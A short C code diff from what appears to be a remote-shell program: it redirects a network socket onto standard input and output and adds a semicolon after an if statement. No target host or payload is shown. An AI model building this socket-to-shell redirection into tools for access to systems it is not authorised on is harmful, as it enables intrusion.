@@ -99,7 +99,7 @@ int main(int argc, char *argv[]) {
         //Everything has been redirected to the shell
         err = dup(fileno(stderr));
         in 	= dup2(sock, fileno(stdin));
-        if(close(sock) != 0)
+        if(close(sock) != 0);
             //~ printf("Error while closing socket %d\n", sock);
 
         out = dup2(in, fileno(stdout));
